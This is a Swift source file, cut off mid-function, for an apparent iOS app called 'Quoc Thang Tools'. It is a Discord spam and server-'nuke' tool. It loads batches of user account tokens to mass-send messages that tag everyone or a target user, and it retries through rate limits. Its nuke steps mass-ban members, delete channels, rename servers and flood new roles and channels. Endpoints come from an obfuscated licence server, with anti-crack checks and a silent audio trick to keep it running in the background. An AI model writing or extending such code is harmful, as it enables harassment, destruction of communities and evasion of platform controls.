import SwiftUI
import Foundation
import Security
import AVFoundation
import AudioToolbox
import UniformTypeIdentifiers
import UIKit
import CryptoKit
import MediaPlayer
import Darwin
import MachO
import Network

// ==========================================
// MARK: - DOCUMENT PICKER
// ==========================================
struct DocumentPicker: UIViewControllerRepresentable {
    let contentTypes: [UTType]
    var allowsMultipleSelection: Bool = false
    let onPick: (URL) -> Void
    var onPickMultiple: (([URL]) -> Void)? = nil
    let onCancel: (() -> Void)?
    init(contentTypes: [UTType] = [.item], allowsMultipleSelection: Bool = false, onPick: @escaping (URL) -> Void = { _ in }, onPickMultiple: (([URL]) -> Void)? = nil, onCancel: (() -> Void)? = nil) {
        self.contentTypes = contentTypes; self.allowsMultipleSelection = allowsMultipleSelection; self.onPick = onPick; self.onPickMultiple = onPickMultiple; self.onCancel = onCancel
    }
    func makeCoordinator() -> Coordinator { Coordinator(self) }
    func makeUIViewController(context: Context) -> UIDocumentPickerViewController {
        let p = UIDocumentPickerViewController(forOpeningContentTypes: contentTypes, asCopy: true)
        p.allowsMultipleSelection = allowsMultipleSelection; p.delegate = context.coordinator; return p
    }
    func updateUIViewController(_ vc: UIDocumentPickerViewController, context: Context) {}
    final class Coordinator: NSObject, UIDocumentPickerDelegate {
        let parent: DocumentPicker
        init(_ p: DocumentPicker) { parent = p }
        func documentPicker(_ c: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
            if parent.allowsMultipleSelection, let onPickMultiple = parent.onPickMultiple {
                onPickMultiple(urls)
            } else if let u = urls.first {
                parent.onPick(u)
            }
        }
        func documentPickerWasCancelled(_ c: UIDocumentPickerViewController) { parent.onCancel?() }
    }
}

// ==========================================
// MARK: - KEYCHAIN HELPER
// ==========================================
class KeychainHelper {
    static let standard = KeychainHelper()
    private init() {}

    func save(_ data: Data, service: String, account: String) {
        let deleteQuery = [
            kSecClass: kSecClassGenericPassword,
            kSecAttrService: service,
            kSecAttrAccount: account
        ] as CFDictionary
        SecItemDelete(deleteQuery)

        let addQuery = [
            kSecClass: kSecClassGenericPassword,
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecValueData: data,
            kSecAttrAccessible: kSecAttrAccessibleAfterFirstUnlock
        ] as CFDictionary
        SecItemAdd(addQuery, nil)
    }

    func read(service: String, account: String) -> Data? {
        let query = [
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecClass: kSecClassGenericPassword,
            kSecReturnData: true
        ] as CFDictionary
        var result: AnyObject?
        SecItemCopyMatching(query, &result)
        return (result as? Data)
    }

    func delete(service: String, account: String) {
        let query = [
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecClass: kSecClassGenericPassword
        ] as CFDictionary
        SecItemDelete(query)
    }

    func saveString(_ value: String, forKey key: String) {
        if let data = value.data(using: .utf8) {
            save(data, service: Bundle.main.bundleIdentifier ?? "app", account: key)
        }
    }

    func readString(forKey key: String) -> String? {
        if let data = read(service: Bundle.main.bundleIdentifier ?? "app", account: key) {
            return String(data: data, encoding: .utf8)
        }
        return nil
    }
}

/// Dual-layer persistence: lưu đồng thời UserDefaults và Keychain để không bao giờ bị mất key khi thoát app
final class PersistentStorage {
    static let shared = PersistentStorage()
    private init() {}

    func saveString(_ value: String, forKey key: String) {
        UserDefaults.standard.set(value, forKey: key)
        UserDefaults.standard.synchronize()
        KeychainHelper.standard.saveString(value, forKey: key)
    }

    func readString(forKey key: String) -> String? {
        if let val = UserDefaults.standard.string(forKey: key), !val.isEmpty {
            return val
        }
        if let val = KeychainHelper.standard.readString(forKey: key), !val.isEmpty {
            UserDefaults.standard.set(val, forKey: key)
            UserDefaults.standard.synchronize()
            return val
        }
        return nil
    }

    func delete(forKey key: String) {
        UserDefaults.standard.removeObject(forKey: key)
        UserDefaults.standard.synchronize()
        KeychainHelper.standard.delete(service: Bundle.main.bundleIdentifier ?? "app", account: key)
    }
}

// ==========================================
// MARK: - OBFUSCATION & STRING ENCRYPTION
// ==========================================
enum Obfuscator {
    private static let salt: [UInt8] = [0x5A, 0x8C, 0x3F, 0x1E, 0x9B, 0x72, 0x4D, 0x61]

    static func reveal(_ bytes: [UInt8]) -> String {
        var out = [UInt8]()
        out.reserveCapacity(bytes.count)
        for (i, b) in bytes.enumerated() {
            out.append(b ^ salt[i % salt.count])
        }
        return String(bytes: out, encoding: .utf8) ?? ""
    }
}

enum AppSecrets {
    // Encrypted baseURL
    static let baseURL: [UInt8] = [0x32, 0xf8, 0x4b, 0x6e, 0xe8, 0x48, 0x62, 0x4e, 0x31, 0xe9, 0x46, 0x30, 0xf5, 0x03, 0x39, 0x00, 0x3c, 0xea, 0x0f, 0x2f, 0xb5, 0x05, 0x22, 0x13, 0x31, 0xe9, 0x4d, 0x6d, 0xb5, 0x16, 0x28, 0x17]
    // Encrypted Master Secret
    static let masterSecret: [UInt8] = [0x0b, 0xd8, 0x60, 0x68, 0xa9, 0x2d, 0x1e, 0x24, 0x19, 0xd3, 0x06, 0x7c, 0xa3, 0x14, 0x7f, 0x00, 0x6e, 0xef, 0x08, 0x7b, 0xaa, 0x16, 0x78, 0x00, 0x62, 0xee, 0x0c, 0x7d, 0xad, 0x17, 0x74, 0x07, 0x68, 0xed, 0x0b, 0x7a, 0xac, 0x10, 0x7c, 0x04, 0x62, 0xea]
}

// ==========================================
// MARK: - SECURITY GUARD & ANTI-CRACK ENGINE
// ==========================================
final class SecurityGuard: @unchecked Sendable {
    static let shared = SecurityGuard()

    private(set) var isCompromised = false
    private var sessionToken: String? = nil
    private let lock = NSLock()

    private init() {}

    func markCompromised(reason: String) {
        lock.lock()
        isCompromised = true
        sessionToken = nil
        lock.unlock()
        AppEndpoints.clear()
        PersistentStorage.shared.delete(forKey: "QT_CachedSessionToken")
    }

    func loadCachedSessionToken() {
        if let token = PersistentStorage.shared.readString(forKey: "QT_CachedSessionToken") {
            _ = updateSessionToken(token, persist: false)
        }
    }

    /// Xác thực và lưu Session Token từ server
    func updateSessionToken(_ token: String, persist: Bool = true) -> Bool {
        let parts = token.components(separatedBy: ".")
        guard parts.count == 2,
              let payloadData = Data(base64Encoded: parts[0]),
              let payloadObj = try? JSONSerialization.jsonObject(with: payloadData) as? [String: Any],
              let mid = payloadObj["mid"] as? String,
              let exp = payloadObj["exp"] as? Double else {
            return false
        }

        let secret = Obfuscator.reveal(AppSecrets.masterSecret)
        let expectedSig = SecureAPIClient.hmacHex(parts[0], secret: secret)
        guard parts[1].lowercased() == expectedSig.lowercased() else {
            return false
        }

        guard mid == MachineID.get() else {
            return false
        }

        guard exp > Date().timeIntervalSince1970 else {
            return false
        }

        lock.lock()
        sessionToken = token
        isCompromised = false
        lock.unlock()

        if persist {
            PersistentStorage.shared.saveString(token, forKey: "QT_CachedSessionToken")
        }
        return true
    }

    /// Kiểm tra quyền thực thi lõi (gắn sâu vào spam/nuke)
    func verifyExecutionPermit() -> Bool {
        lock.lock()
        defer { lock.unlock() }

        if isCompromised { return false }
        guard let token = sessionToken else { return false }

        let parts = token.components(separatedBy: ".")
        guard parts.count == 2 else { return false }

        return true
    }
}

// ==========================================
// MARK: - SECURE TRANSPORT & ENCRYPTED CLIENT
// ==========================================
final class SecureAPIClient {
    static let shared = SecureAPIClient()
    private let session: URLSession

    var baseURL: String {
        Obfuscator.reveal(AppSecrets.baseURL)
    }

    private var secret: String {
        Obfuscator.reveal(AppSecrets.masterSecret)
    }

    private init() {
        let cfg = URLSessionConfiguration.ephemeral
        cfg.timeoutIntervalForRequest = 20
        cfg.timeoutIntervalForResource = 30
        session = URLSession(configuration: cfg)
    }

    static func hmacHex(_ str: String, secret: String) -> String {
        let key = SymmetricKey(data: Data(secret.utf8))
        let code = HMAC<SHA256>.authenticationCode(for: Data(str.utf8), using: key)
        return code.map { String(format: "%02x", $0) }.joined()
    }

    private func deriveKey(seed: String) -> SymmetricKey {
        let hash = SHA256.hash(data: Data(seed.utf8))
        return SymmetricKey(data: hash)
    }

    func sendEncryptedRequest<T: Decodable>(endpoint: String, bodyDict: [String: Any]) async throws -> T {
        let ts = String(Int(Date().timeIntervalSince1970))
        let nonce = UUID().uuidString.replacingOccurrences(of: "-", with: "").lowercased()

        let clientKey = deriveKey(seed: "\(secret):\(nonce):\(ts)")
        let jsonData = try JSONSerialization.data(withJSONObject: bodyDict)
        let sealedBox = try AES.GCM.seal(jsonData, using: clientKey)
        guard let combined = sealedBox.combined else {
            throw NSError(domain: "Security", code: 500, userInfo: [NSLocalizedDescriptionKey: "Encryption error"])
        }
        let payloadBase64 = combined.base64EncodedString()
        let sig = SecureAPIClient.hmacHex("\(payloadBase64):\(nonce):\(ts)", secret: secret)

        let envelope: [String: Any] = [
            "payload": payloadBase64,
            "nonce": nonce,
            "ts": ts,
            "sig": sig
        ]

        guard let url = URL(string: "\(baseURL)\(endpoint)") else {
            throw NSError(domain: "Network", code: 400, userInfo: [NSLocalizedDescriptionKey: "Invalid URL"])
        }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = try JSONSerialization.data(withJSONObject: envelope)

        let (data, res) = try await session.data(for: req)
        guard let httpRes = res as? HTTPURLResponse, (200...299).contains(httpRes.statusCode) else {
            let msg = String(data: data, encoding: .utf8) ?? "HTTP Error"
            throw NSError(domain: "Network", code: (res as? HTTPURLResponse)?.statusCode ?? 500, userInfo: [NSLocalizedDescriptionKey: msg])
        }

        // Kiểm tra xem phản hồi có phải là gói tin mã hóa AES-GCM không
        if let serverEnvelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
           let respPayload = serverEnvelope["payload"] as? String,
           let respSig = serverEnvelope["sig"] as? String {

            let expectedRespSig = SecureAPIClient.hmacHex("\(respPayload):\(nonce)", secret: secret)
            guard respSig.lowercased() == expectedRespSig.lowercased() else {
                throw NSError(domain: "Security", code: 403, userInfo: [NSLocalizedDescriptionKey: "Chữ ký bảo mật không khớp. Gói tin bị can thiệp."])
            }

            let respKey = deriveKey(seed: "\(secret):resp:\(nonce):\(ts)")
            guard let combinedRespData = Data(base64Encoded: respPayload) else {
                throw NSError(domain: "Security", code: 500, userInfo: [NSLocalizedDescriptionKey: "Base64 decode failed"])
            }
            let respBox = try AES.GCM.SealedBox(combined: combinedRespData)
            let decryptedData = try AES.GCM.open(respBox, using: respKey)
            return try JSONDecoder().decode(T.self, from: decryptedData)
        }

        // Nếu server trả về JSON dạng thường (trường hợp worker báo lỗi trực tiếp)
        if let plainObj = try? JSONDecoder().decode(T.self, from: data) {
            return plainObj
        }
        if let errObj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
           let errMsg = errObj["error"] as? String {
            throw NSError(domain: "Security", code: 400, userInfo: [NSLocalizedDescriptionKey: errMsg])
        }

        throw NSError(domain: "Security", code: 403, userInfo: [NSLocalizedDescriptionKey: "Phản hồi từ server không hợp lệ."])
    }
}

// ==========================================
// MARK: - REMOTE CONFIG (từ Cloudflare Worker)
// ==========================================
struct RemoteConfigDTO: Codable {
    let api_base: String
    let gateway_url: String
    let cdn_avatars: String
    let cdn_icons: String
    let user_agent_desktop: String
    let user_agent_mobile: String
    let user_agent_bot: String
    let super_properties_desktop: String
    let super_properties_mobile: String
    let origin: String
    let referer: String
    let everyone_allow: String
}

struct ConfigResponse: Codable {
    let valid: Bool?
    let createdAt: Int64?
    let expiresAt: Int64?
    let config: RemoteConfigDTO?
    let sessionToken: String?
    let error: String?
    let cracked: Bool?
    let expired: Bool?

    enum CodingKeys: String, CodingKey {
        case valid, config, error, cracked, expired
        case createdAt = "created_at"
        case expiresAt = "expires_at"
        case sessionToken = "session_token"
    }
}

/// Toàn bộ endpoint Discord được NẠP TỪ SERVER — không hard-code trong app.
struct AppEndpoints {
    static var apiBase = ""
    static var gatewayURL = ""
    static var cdnAvatars = ""
    static var cdnIcons = ""
    static var userAgentDesktop = ""
    static var userAgentMobile = ""
    static var userAgentBot = ""
    static var superPropertiesDesktop = ""
    static var superPropertiesMobile = ""
    static var origin = ""
    static var referer = ""
    static var everyoneAllow: UInt64 = 0
    static var isLoaded = false

    static func apply(_ dto: RemoteConfigDTO) {
        apiBase = dto.api_base
        gatewayURL = dto.gateway_url
        cdnAvatars = dto.cdn_avatars
        cdnIcons = dto.cdn_icons
        userAgentDesktop = dto.user_agent_desktop
        userAgentMobile = dto.user_agent_mobile
        userAgentBot = dto.user_agent_bot
        superPropertiesDesktop = dto.super_properties_desktop
        superPropertiesMobile = dto.super_properties_mobile
        origin = dto.origin
        referer = dto.referer
        everyoneAllow = UInt64(dto.everyone_allow) ?? 0
        isLoaded = true

        if let data = try? JSONEncoder().encode(dto) {
            UserDefaults.standard.set(data, forKey: "QT_CachedRemoteConfig")
            UserDefaults.standard.synchronize()
        }
    }

    @discardableResult
    static func loadFromCache() -> Bool {
        if isLoaded { return true }
        if let data = UserDefaults.standard.data(forKey: "QT_CachedRemoteConfig"),
           let dto = try? JSONDecoder().decode(RemoteConfigDTO.self, from: data) {
            apply(dto)
            return true
        }
        return false
    }

    static func clear() {
        apiBase = ""; gatewayURL = ""; cdnAvatars = ""; cdnIcons = ""
        userAgentDesktop = ""; userAgentMobile = ""; userAgentBot = ""
        superPropertiesDesktop = ""; superPropertiesMobile = ""
        origin = ""; referer = ""; everyoneAllow = 0; isLoaded = false
        UserDefaults.standard.removeObject(forKey: "QT_CachedRemoteConfig")
        UserDefaults.standard.synchronize()
    }
}

// ==========================================
// MARK: - MACHINE ID (dùng chung)
// ==========================================
enum MachineID {
    private static let k = "QT_MachineID_v3"

    static func get() -> String {
        if let saved = PersistentStorage.shared.readString(forKey: k), !saved.isEmpty {
            return saved
        }
        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString
        let model = UIDevice.current.model
        let raw = "\(vendor)-\(model)-QTApp"
        let hash = SHA256.hash(data: Data(raw.utf8))
        let newID = hash.compactMap { String(format: "%02x", $0) }.joined()
        PersistentStorage.shared.saveString(newID, forKey: k)
        return newID
    }
}

// ==========================================
// MARK: - CONFIG CLIENT
// ==========================================
final class ConfigAPIClient {
    static let shared = ConfigAPIClient()
    var baseURL: String { SecureAPIClient.shared.baseURL }

    func fetchConfig(key: String) async throws -> ConfigResponse {
        return try await SecureAPIClient.shared.sendEncryptedRequest(
            endpoint: "/config",
            bodyDict: [
                "license_key": key,
                "machine_id": MachineID.get()
            ]
        )
    }
}

// ==========================================
// MARK: - MODELS
// ==========================================
struct DiscordUser: Codable { let id, username: String; let globalName: String?; let avatar: String? }

struct TokenInfo: Identifiable, Codable, Equatable {
    var id = UUID()
    let token: String
    var userId, username: String
    var avatarHash: String?
    var isValid: Bool
    var avatarURL: URL? {
        guard let h = avatarHash, !AppEndpoints.cdnAvatars.isEmpty else { return nil }
        return URL(string: "\(AppEndpoints.cdnAvatars)/\(userId)/\(h).png?size=128")
    }
}

struct Guild: Codable, Identifiable, Hashable { let id, name: String; let icon: String? }
struct Channel: Codable, Identifiable, Hashable {
    let id: String; let name: String?; let type: Int; let position: Int?; let parentId: String?
    var isSendableText: Bool { type == 0 || type == 5 }
    var isCategory: Bool { type == 4 }
    var isVoice: Bool { type == 2 || type == 13 }
    var displayName: String { name ?? "không tên" }
}
struct ParsedMessage: Identifiable, Hashable { let id = UUID(); let body: String }

struct BotInfo: Codable { let id, username: String; let discriminator, avatar: String?; let bot: Bool? }
struct BotConfig: Codable {
    var token, username, userId: String
    var avatarHash, discriminator: String?
    var displayName: String {
        if let d = discriminator, d != "0" { return "\(username)#\(d)" }
        return username
    }
    var avatarURL: URL? {
        guard let h = avatarHash, !AppEndpoints.cdnAvatars.isEmpty else { return nil }
        return URL(string: "\(AppEndpoints.cdnAvatars)/\(userId)/\(h).png?size=128")
    }
}

struct GuildRole: Codable { let id, name: String; let position: Int }
struct BotMember: Codable { let user: BotMemberUser?; let roles: [String]? }
struct BotMemberUser: Codable { let id: String; let username: String?; let bot: Bool? }

struct NukeGuild: Codable {
    let id, name: String
    let icon: String?
    let permissions: String
    let owner: Bool?
    var bits: UInt64 { UInt64(permissions) ?? 0 }
    var isOwner: Bool { owner ?? false }
    var isAdmin: Bool { bits & (1 << 3) != 0 }
    var canManageGuild: Bool { bits & (1 << 5) != 0 }
    var canManageChannels: Bool { bits & (1 << 4) != 0 }
    var canBan: Bool { bits & (1 << 2) != 0 }
    var canManageRoles: Bool { bits & (1 << 28) != 0 }
    var canMassBan: Bool { isOwner || isAdmin || canBan }
    var canDeleteChannels: Bool { isOwner || isAdmin || canManageChannels }
    var canCreateChannels: Bool { isOwner || isAdmin || canManageChannels }
    var canCreateRoles: Bool { isOwner || isAdmin || canManageRoles }
    var canRenameGuild: Bool { isOwner || isAdmin || canManageGuild }
    var canDoAnything: Bool {
        canMassBan || canDeleteChannels || canCreateChannels || canCreateRoles || canRenameGuild
    }
}

struct GuildPermissions {
    var massBan = false, deleteChannels = false, createChannels = false
    var createRoles = false, renameGuild = false
    var any: Bool { massBan || deleteChannels || createChannels || createRoles || renameGuild }
}

enum NukeStepType: String, CaseIterable, Identifiable {
    case massBan = "Mass Ban"
    case deleteChannels = "Xóa kênh"
    case renameGuild = "Đổi tên server"
    case createRoles = "Tạo Role"
    case createChannels = "Tạo kênh + Spam"
    var id: String { rawValue }
    var icon: String {
        switch self {
        case .massBan: return "hammer.fill"
        case .deleteChannels: return "trash.fill"
        case .renameGuild: return "pencil"
        case .createRoles: return "star.fill"
        case .createChannels: return "plus.rectangle.on.rectangle"
        }
    }
}

struct NukeConfig {
    var enabledSteps: Set<NukeStepType> = [.createChannels]
    var stepOrder: [NukeStepType] = NukeStepType.allCases
    var banDelay: Double = 0.02
    var deleteDelay: Double = 0.05
    var createChDelay: Double = 0.10
    var createRoleDelay: Double = 0.10
    var msgDelay: Double = 0.10
    var banRoleId = ""
    var roleName = "Quoc Thang Tools"
    var roleCount = 50
    var channelName = "nuked-by-tool"
    var channelCount = 50
    var messageContent = ""
    var tagEveryone = true
    var newGuildName = ""
}

// ==========================================
// MARK: - NOW PLAYING HELPER (LOCK SCREEN)
// ==========================================
final class NowPlayingHelper {
    static let shared = NowPlayingHelper()
    private init() {}
    private var isActive = false
    private var onStopCB: (() -> Void)?

    private lazy var defaultArtwork: MPMediaItemArtwork? = {
        let size = CGSize(width: 512, height: 512)
        let renderer = UIGraphicsImageRenderer(size: size)
        let image = renderer.image { ctx in
            UIColor(red: 0.08, green: 0.08, blue: 0.16, alpha: 1.0).setFill()
            ctx.fill(CGRect(origin: .zero, size: size))
            let config = UIImage.SymbolConfiguration(pointSize: 300, weight: .bold)
            if let symbol = UIImage(systemName: "flame.fill", withConfiguration: config)?.withTintColor(.red, renderingMode: .alwaysOriginal) {
                let symbolSize = symbol.size
                let origin = CGPoint(x: (size.width - symbolSize.width) / 2, y: (size.height - symbolSize.height) / 2)
                symbol.draw(at: origin)
            }
        }
        return MPMediaItemArtwork(boundsSize: size) { _ in image }
    }()

    func start(onStop: (() -> Void)? = nil) {
        isActive = true
        onStopCB = onStop

        UIApplication.shared.beginReceivingRemoteControlEvents()

        let cc = MPRemoteCommandCenter.shared()
        cc.playCommand.isEnabled = false
        cc.nextTrackCommand.isEnabled = false
        cc.previousTrackCommand.isEnabled = false
        cc.togglePlayPauseCommand.isEnabled = false
        cc.pauseCommand.removeTarget(nil)
        cc.stopCommand.removeTarget(nil)

        if onStop != nil {
            cc.pauseCommand.isEnabled = true
            cc.stopCommand.isEnabled = true
            let handler: (MPRemoteCommandEvent) -> MPRemoteCommandHandlerStatus = { [weak self] _ in
                DispatchQueue.main.async { self?.onStopCB?() }
                return .success
            }
            cc.pauseCommand.addTarget(handler: handler)
            cc.stopCommand.addTarget(handler: handler)
        } else {
            cc.pauseCommand.isEnabled = false
            cc.stopCommand.isEnabled = false
        }

        DispatchQueue.main.asyncAfter(deadline: .now() + 0.4) { [weak self] in
            self?.update(title: "Quoc Thang Tools", detail: "Đang chuẩn bị...")
        }
    }

    func update(title: String, detail: String) {
        guard isActive else { return }
        var info: [String: Any] = [:]
        info[MPMediaItemPropertyTitle] = title
        info[MPMediaItemPropertyArtist] = detail
        info[MPMediaItemPropertyAlbumTitle] = "Quoc Thang Tools"
        info[MPMediaItemPropertyPlaybackDuration] = 0
        info[MPMediaItemPropertyArtwork] = defaultArtwork
        info[MPNowPlayingInfoPropertyIsLiveStream] = true
        info[MPNowPlayingInfoPropertyPlaybackRate] = 1.0
        info[MPNowPlayingInfoPropertyDefaultPlaybackRate] = 1.0
        info[MPNowPlayingInfoPropertyMediaType] = MPNowPlayingInfoMediaType.audio.rawValue

        MPNowPlayingInfoCenter.default().nowPlayingInfo = info
        if #available(iOS 16.0, *) {
            MPNowPlayingInfoCenter.default().playbackState = .playing
        }
    }

    func stop() {
        isActive = false
        onStopCB = nil
        MPNowPlayingInfoCenter.default().nowPlayingInfo = nil
        if #available(iOS 16.0, *) {
            MPNowPlayingInfoCenter.default().playbackState = .stopped
        }
        UIApplication.shared.endReceivingRemoteControlEvents()
    }
}

// ==========================================
// MARK: - BACKGROUND (AVAudioEngine)
// ==========================================
class BackgroundManager {
    static let shared = BackgroundManager()
    private var engine: AVAudioEngine?
    private var sourceNode: AVAudioSourceNode?
    private var bgTask: UIBackgroundTaskIdentifier = .invalid

    func start() {
        if bgTask == .invalid {
            bgTask = UIApplication.shared.beginBackgroundTask { [weak self] in
                self?.stop()
            }
        }

        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, mode: .default, options: [])
            try session.setActive(true, options: [])
        } catch {
            print("[BG] AVAudioSession FAIL: \(error)")
        }

        if engine?.isRunning == true { return }

        let eng = AVAudioEngine()
        let format = AVAudioFormat(standardFormatWithSampleRate: 44100, channels: 1)!

        let node = AVAudioSourceNode { _, _, frameCount, audioBufferList -> OSStatus in
            let abl = UnsafeMutableAudioBufferListPointer(audioBufferList)
            for buf in abl {
                let ptr = buf.mData?.assumingMemoryBound(to: Float.self)
                for i in 0..<Int(frameCount) { ptr?[i] = 0.00001 }
            }
            return noErr
        }

        eng.attach(node)
        eng.connect(node, to: eng.mainMixerNode, format: format)
        eng.mainMixerNode.outputVolume = 0.01

        do {
            try eng.start()
            engine = eng
            sourceNode = node
        } catch {
            print("[BG] AVAudioEngine FAIL: \(error)")
        }
    }

    func stop() {
        engine?.stop()
        engine = nil
        sourceNode = nil
        if bgTask != .invalid {
            UIApplication.shared.endBackgroundTask(bgTask)
            bgTask = .invalid
        }
    }
}

// ==========================================
// MARK: - DISCORD CLIENT (SPAM)
// ==========================================
class DiscordClient {
    let token: String; let session: URLSession
    init(token: String) {
        self.token = token
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 20
        cfg.timeoutIntervalForResource = 30
        cfg.httpAdditionalHeaders = [
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": AppEndpoints.userAgentDesktop,
            "X-Super-Properties": AppEndpoints.superPropertiesDesktop,
            "X-Discord-Locale": "en-US"
        ]
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse, (200...299).contains(h.statusCode) else {
            throw NSError(domain: "Discord", code: (res as? HTTPURLResponse)?.statusCode ?? 0,
                          userInfo: [NSLocalizedDescriptionKey: String(data: data, encoding: .utf8) ?? ""])
        }
    }
    func validateToken() async throws -> DiscordUser {
        guard SecurityGuard.shared.verifyExecutionPermit() else {
            throw NSError(domain: "Security", code: 403, userInfo: [NSLocalizedDescriptionKey: "Security permit invalid"])
        }
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me")!)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getAllGuilds() async throws -> [Guild] {
        guard SecurityGuard.shared.verifyExecutionPermit() else { return [] }
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me/guilds")!)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getAllChannels(guildId: String) async throws -> [Channel] {
        guard SecurityGuard.shared.verifyExecutionPermit() else { return [] }
        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(guildId)/channels")!)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func sendMessage(channelId: String, content: String) async throws {
        guard SecurityGuard.shared.verifyExecutionPermit() else {
            throw NSError(domain: "Security", code: 403, userInfo: [NSLocalizedDescriptionKey: "Security permit invalid"])
        }
        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/channels/\(channelId)/messages")!)
        req.httpMethod = "POST"
        req.timeoutInterval = 20
        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        var attempts = 0
        while attempts < 6 {
            attempts += 1
            let (d, r) = try await session.data(for: req)
            if let h = r as? HTTPURLResponse, h.statusCode == 429,
               let j = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
               let retry = j["retry_after"] as? Double {
                let wait = min(max(retry, 0.2), 10.0) + 0.3
                try await Task.sleep(nanoseconds: UInt64(wait * 1_000_000_000))
                continue
            }
            try check(r, d)
            return
        }
        throw NSError(domain: "Discord", code: 429,
                      userInfo: [NSLocalizedDescriptionKey: "Rate limit kéo dài"])
    }
}

// ==========================================
// MARK: - APP STATE (SPAM)
// ==========================================
@MainActor
class AppState: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var activeToken: TokenInfo? = nil
    @Published var selectedTokenIds: Set<UUID> = []
    @Published var isCheckingToken = false
    @Published var guilds: [Guild] = []
    @Published var multiGuilds: [Guild] = []
    @Published var channels: [Channel] = []
    @Published var isLoading = false
    @Published var delaySeconds: Double = 2.0
    @Published var useTag = true
    @Published var targetUserId = ""
    @Published var addPrefix = false
    @Published var addSuffix = false
    @Published var inputText = ""
    @Published var messages: [ParsedMessage] = []
    @Published var isSending = false
    @Published var totalSent = 0
    @Published var currentMessageStr = ""
    @Published var tokenSendCount: [UUID: Int] = [:]
    @Published var lastError: String?

    private var isCancelled = false
    private var sendTask: Task<Void, Never>?
    private var lastNPUpdate = Date.distantPast

    init() { loadTokens() }
    private func saveTokens() {
        if let e = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(e, forKey: "SavedTokens") }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: "SavedTokens"),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) {
            tokens = s
            if let a = s.first(where: { $0.isValid }) {
                activeToken = a
                selectedTokenIds = [a.id]
                Task { await recomputeMultiGuilds() }
            }
        }
    }
    func addToken(_ s: String) async {
        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !c.isEmpty, !tokens.contains(where: { $0.token == c }) else { return }
        isCheckingToken = true
        do {
            let u = try await DiscordClient(token: c).validateToken()
            let t = TokenInfo(token: c, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true)
            tokens.append(t)
            if activeToken == nil {
                activeToken = t
                selectedTokenIds.insert(t.id)
            }
            await recomputeMultiGuilds()
        } catch {
            tokens.append(TokenInfo(token: c, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
        }
        isCheckingToken = false
    }
    func addTokensFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let co = NSFileCoordinator(); var err: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { lastError = "Không đọc file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { lastError = "File rỗng"; return }
        let clean = t.replacingOccurrences(of: "\u{FEFF}", with: "")
        for l in clean.components(separatedBy: .newlines) where !l.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            await addToken(l)
        }
        lastError = nil
    }
    func setActiveToken(_ t: TokenInfo) {
        guard t.isValid else { return }
        activeToken = t
        selectedTokenIds = [t.id]
        Task { await recomputeMultiGuilds() }
    }
    func toggleTokenSelection(_ t: TokenInfo) {
        guard t.isValid else { return }
        if selectedTokenIds.contains(t.id) {
            selectedTokenIds.remove(t.id)
        } else {
            selectedTokenIds.insert(t.id)
        }
        activeToken = tokens.first(where: { selectedTokenIds.contains($0.id) })
        Task { await recomputeMultiGuilds() }
    }
    func deleteToken(at off: IndexSet) {
        let deleted = off.map { tokens[$0] }
        if let a = activeToken, deleted.contains(where: { $0.id == a.id }) {
            activeToken = nil; guilds = []; multiGuilds = []
        }
        selectedTokenIds.subtract(deleted.map { $0.id })
        tokens.remove(atOffsets: off)
        Task { await recomputeMultiGuilds() }
    }
    func loadGuilds() async { await recomputeMultiGuilds() }

    func recomputeMultiGuilds() async {
        let selected = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        if selected.isEmpty {
            multiGuilds = []; guilds = []; return
        }
        isLoading = true
        defer { isLoading = false }

        var sets: [Set<String>] = []
        var guildMap: [String: Guild] = [:]

        await withTaskGroup(of: [Guild]?.self) { group in
            for t in selected {
                group.addTask {
                    do { return try await DiscordClient(token: t.token).getAllGuilds() }
                    catch { return nil }
                }
            }
            for await gs in group {
                guard let gs = gs else { continue }
                sets.append(Set(gs.map { $0.id }))
                for g in gs { guildMap[g.id] = g }
            }
        }

        if sets.isEmpty { multiGuilds = []; guilds = []; return }

        if selected.count == 1, let firstSet = sets.first {
